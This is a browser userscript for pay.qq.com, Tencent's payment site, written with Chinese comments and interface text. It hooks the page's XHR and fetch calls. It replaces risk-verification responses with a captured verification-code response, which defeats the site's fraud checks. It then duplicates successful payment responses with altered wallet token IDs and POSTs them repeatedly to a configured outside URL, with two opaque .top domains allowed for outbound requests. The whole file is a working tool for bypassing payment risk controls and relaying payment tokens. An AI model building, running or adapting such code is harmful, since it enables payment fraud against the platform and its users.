// ==UserScript==
// @name         狐狸自动传码
// @namespace    https://iiifox.me/
// @version      0.0.2
// @description  狐狸自动传码，此为初版，非正式版。功能待优化
// @author       iiifox
// @match        *://pay.qq.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @updateURL    https://iiifox.me/assets/huli/chuanma.js
// @downloadURL  https://iiifox.me/assets/huli/chuanma.js
// @connect      081w5a8cim.top
// @connect      8w0m6rjg3l.top
// ==/UserScript==

(function () {
        'use strict';

        const localStorage_TOMATOS_RESP_KEY = 'tomatos_pay_response';
        const TOMATOS_PF = 'pay_R-__mds_bigR_S22N_commander_id_zhg_0_v1_0_0.common2_v1-android';

        // ---------------- 工具函数 ----------------
        function getCapturedResponse() {
            try {
                return localStorage.getItem(localStorage_TOMATOS_RESP_KEY);
            } catch (e) {
                return null;
            }
        }

        function setCapturedResponse(response) {
            try {
                localStorage.setItem(localStorage_TOMATOS_RESP_KEY, response);
                return true;
            } catch (e) {
                return false;
            }
        }

        function clearCapturedResponse() {
            try {
                localStorage.removeItem(localStorage_TOMATOS_RESP_KEY);
                return true;
            } catch (e) {
                return false;
            }
        }

        function getConfig() {
            const url = GM_getValue('requestUrl', '');
            const length = Number(GM_getValue('arrayLength', 3));
            // 如果没有输入就返回 null
            if (!url || !length) return null;
            return {url, length};
        }

        function getPfFromPage() {
            try {
                return new URL(window.location.href).searchParams.get('pf');
            } catch (e) {
                return null;
            }
        }


        const rand4 = () => Math.floor(Math.random() * 10000).toString().padStart(4, '0');

        function encodeItem(item) {
            const str = JSON.stringify(item);
            const utf8Bytes = new TextEncoder().encode(str);
            let binary = String.fromCharCode(...utf8Bytes);
            return btoa(binary);
        }

        function showToast(msg, type = 'info') {
            if (!document.body) {
                return;
            }
            const colors = {info: '#2196F3', success: '#4CAF50', warning: '#FF9800', error: '#ff4444'};
            const toast = document.createElement('div');
            toast.textContent = msg;
            Object.assign(toast.style, {
                position: 'fixed', bottom: '60px', right: '10px',
                background: colors[type] || colors.info, color: '#fff',
                padding: '8px 12px', borderRadius: '6px',
                fontSize: '12px', zIndex: 10001
            });
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.remove();
            }, 2000);
        }

        async function copyToClipboard(text) {
            try {
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    await navigator.clipboard.writeText(text);
                    return true;
                } else {
                    const ta = document.createElement('textarea');
                    ta.value = text;
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    document.body.removeChild(ta);
                    return true;
                }
            } catch (e) {
                console.error('复制失败', e);
                return false;
            }
        }

        // ---------------- 风险替换成功后的统一传码函数 ----------------
        function handleResponse(responseJSON) {
            const config = getConfig();
            if (!config) return;
            const {url, length} = config;
            let successCount = 0;

            const requests = Array.from({length}).map(() => {
                return new Promise(resolve => {
                    const item = structuredClone(responseJSON);
                    item.qqwallet_info.qqwallet_tokenId += '&' + rand4();
                    const encodedData = encodeItem(item);
                    GM_xmlhttpRequest({
                        method: 'POST',
                        url,
                        headers: {"Content-Type": "application/x-www-form-urlencoded"},
                        data: encodedData,
                        onload: xhr => {
                            successCount++;
                            resolve();
                        },
                        onerror: err => {
                            resolve();
                        }
                    });
                });
            });
            Promise.all(requests).then(() => {
                showToast(`传码完成：成功 ${successCount} 次`, "success")
            });
        }

        // ---------------- 判断目标请求 ----------------
        const TARGET_PATHS = ["/web_save", "/mobile_save", "/mobile_buy_page"];

        function isTargetUrl(url) {
            return TARGET_PATHS.some(path => url.includes(path));
        }

        // ---------------- API拦截 ----------------
        function setupAPICapture() {
            // ----------- XHR 拦截 -----------
            const origOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function (method, url, ...args) {
                this._isTarget = isTargetUrl(url);
                return origOpen.call(this, method, url, ...args);
            };

            const origSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.send = function (...args) {
                if (!this._isTarget) return origSend.apply(this, args);

                const xhr = this;
                // 监听 readyState 事件
                const originalOnreadystatechange = xhr.onreadystatechange;
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        try {
                            handleXhr(xhr)
                        } catch (e) {
                            console.error(e);
                        }
                    }
                    if (originalOnreadystatechange) originalOnreadystatechange.apply(xhr, arguments);
                };
                // 监听 onload 事件
                const originalOnload = xhr.onload;
                xhr.onload = function () {
                    handleXhr(xhr);
                    if (originalOnload) originalOnload.apply(xhr, arguments);
                }
                return origSend.apply(this, args);
            };

            function handleXhr(xhr) {
                const responseJSON = JSON.parse(xhr.responseText)
                const ret = responseJSON.ret;
                // 捕获红番茄验证码响应内容
                if (getPfFromPage() === TOMATOS_PF) {
                    if (ret === 2022) {
                        setCapturedResponse(JSON.stringify(responseJSON));
                        showToast('✅ 已捕获红番茄验证码响应内容 (xhr)', "success");
                    }
                } else {
                    // 将狐狸风险验证替换为捕获的响应内容
                    if (ret === 1138) {
                        const captured = getCapturedResponse();
                        if (captured) {
                            Object.defineProperties(xhr, {
                                responseText: {value: captured, writable: false, configurable: true},
                                response: {value: captured, writable: false, configurable: true}
                            });
                            clearCapturedResponse();
                            showToast('🔄 已将风险验证替换为验证码', 'warning');
                        } else {
                            showToast('🔄 请先捕获验证码请求再来过风险验证', 'error');
                        }
                    } else if (ret === 0) {
                        if (!xhr._headlerXhr) {
                            xhr._headlerXhr = true
                            handleResponse(responseJSON);
                        }
                    }
                }
            }

            // ----------- fetch 拦截 -----------
            const origFetch = window.fetch;
            window.fetch = async function (input, init) {
                const url = typeof input === 'string' ? input : input?.url;
                let resp = await origFetch(input, init);
                // fetch 响应是流 → clone 一份给 handleResponseWrapper
                if (isTargetUrl(url)) {
                    const pfInPage = getPfFromPage();
                    const cloned = resp.clone();
                    const text = await cloned.text();
                    try {
                        const json = JSON.parse(text);
                        const ret = json.ret
                        if (pfInPage === TOMATOS_PF) {
                            if (ret === 2022) {
                                setCapturedResponse(JSON.stringify(json));
                                showToast('✅ 已捕获红番茄验证码响应内容 (fetch)', "success");
                            }
                        } else {
                            if (ret === 1138) {
                                const captured = getCapturedResponse();
                                if (captured) {
                                    clearCapturedResponse();
                                    showToast('🔄 已将风险验证替换为验证码', 'warning');
                                    return new Response(captured, {
                                        status: resp.status,
                                        statusText: resp.statusText,
                                        headers: resp.headers
                                    });
                                }
                                showToast('🔄 请先捕获验证码请求再来过风险验证', 'error');
                            } else if (ret === 0) {
                                handleResponse(json);
                            }
                        }
                    } catch (e) {
                        console.error('fetch解析失败', e);
                    }
                }
                return resp;
            };
        }

        // ---------------- 控制面板 & 配置窗口 ----------------
        function createControlPanel() {
            const miniButton = document.createElement('div');
            miniButton.innerHTML = `<div style="position:fixed;top:10px;left:10px;background:rgba(0,0,0,0.8);color:white;padding:6px 8px;border-radius:6px;z-index:9999;font-family:Arial;font-size:11px;cursor:pointer;border:1px solid #444;backdrop-filter:blur(5px);">⚙️</div>`;
            document.body.appendChild(miniButton);

            const panel = document.createElement('div');
            panel.innerHTML = `
<div style="position:fixed;top:10px;left:10px;background:rgba(0,0,0,0.95);color:white;padding:8px 12px;border-radius:8px;z-index:10000;font-family:Arial;font-size:12px;width:180px;border:1px solid #444;backdrop-filter:blur(5px);">

    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
        <span style="color:#4CAF50;font-weight:bold;">API拦截</span>
        <button id="togglePanel" style="background:transparent;color:#ccc;border:none;padding:2px 6px;border-radius:3px;cursor:pointer;font-size:10px;">隐藏</button>
    </div>
    <!-- 状态显示 -->
    <div style="font-size:10px;color:#ccc;line-height:1.3;margin-bottom:6px;">
        <div>捕获状态: <span id="captureStatus" style="color:#ff4444">✗ 未捕获</span></div>
    </div>
    <!-- 操作按钮 -->
    <div style="display:flex;gap:4px;margin-bottom:6px;">
        <button id="clearCapture" style="background:#ff4444;color:white;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;font-size:10px;line-height:1;">清除捕获</button>
        <button id="copyResponse" style="background:#2196F3;color:white;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;font-size:10px;line-height:1;">复制捕获</button>
    </div>
    <!-- 传码面板 -->
    <div style="margin-top:6px;">
        <button id="showConfigBtn" style="font-size:10px;color:#fff;background:#4CAF50;border:none;padding:2px 4px;border-radius:3px;cursor:pointer;">显示配置窗口</button>
        <div id="configPanel" style="display:none;margin-top:4px;">
            <div style="margin-bottom:4px;">
                <label>账号链接:</label>
                <input type="text" id="requestUrlInput" value="${GM_getValue('requestUrl', '')}" style="width:180px;font-size:12px;background:#333;color:#fff;border:1px solid #555;border-radius:3px;padding:2px 4px;">
            </div>
            <div style="margin-bottom:4px;">
                <label>传码次数:</label>
                <input type="number" id="arrayLengthInput" value="${GM_getValue('arrayLength', '1')}" style="width:50px;font-size:12px;background:#333;color:#fff;border:1px solid #555;border-radius:3px;padding:2px 4px;">
            </div>
            <button id="saveConfigBtn" style="font-size:10px;color:#fff;background:#4CAF50;border:none;padding:2px 4px;border-radius:3px;cursor:pointer;margin-top:2px;">保存</button>
        </div>
    </div>
</div>
    `;
            document.body.appendChild(panel);

            // 面板显示or隐藏
            let panelVisible = true;

            function updatePanelVisibility() {
                if (panelVisible) {
                    panel.style.display = 'block';
                    miniButton.style.display = 'none';
                    panel.querySelector('#togglePanel').textContent = '隐藏';
                } else {
                    panel.style.display = 'none';
                    miniButton.style.display = 'block';
                }
            }

            updatePanelVisibility();
            panel.querySelector('#togglePanel').addEventListener('click', () => {
                panelVisible = !panelVisible;
                updatePanelVisibility();
            });
            miniButton.addEventListener('click', () => {
                panelVisible = true;
                updatePanelVisibility();
            });

            // 清除捕获
            panel.querySelector('#clearCapture').addEventListener('click', () => {
                clearCapturedResponse();
                updateStatus();
                showToast('已清除捕获', 'success');
            });
            // 复制捕获
            panel.querySelector('#copyResponse').addEventListener('click', () => {
                const r = getCapturedResponse();
                if (r) {
                    copyToClipboard(r);
                    showToast('已复制捕获', 'success');
                } else showToast('无捕获内容', 'error');
            });

            // 配置窗口显示or隐藏
            panel.querySelector('#showConfigBtn').addEventListener('click', () => {
                const cp = panel.querySelector('#configPanel');
                if (cp.style.display === 'none') {
                    cp.style.display = 'block';
                    panel.querySelector('#showConfigBtn').textContent = '隐藏配置窗口';
                } else {
                    cp.style.display = 'none';
                    panel.querySelector('#showConfigBtn').textContent = '显示配置窗口';
                }
            });
            // 保存配置参数
            panel.querySelector('#saveConfigBtn').addEventListener('click', () => {
                const url = panel.querySelector('#requestUrlInput').value;
                const len = panel.querySelector('#arrayLengthInput').value;
                GM_setValue('requestUrl', url);
                GM_setValue('arrayLength', len);
                showToast('配置已保存', 'success');
            });

            function updateStatus() {
                const captureStatus = panel.querySelector('#captureStatus');
                captureStatus.textContent = getCapturedResponse() ? '✓ 已捕获' : '✗ 未捕获';
                captureStatus.style.color = getCapturedResponse() ? '#4CAF50' : '#ff4444';
            }

            setInterval(updateStatus, 1000);
        }


        // ---------------- 初始化 ----------------
        const wait = setInterval(() => {
            if (document.body) {
                clearInterval(wait);
                createControlPanel();
                setupAPICapture();
            }
        }, 100);
    }

)
();
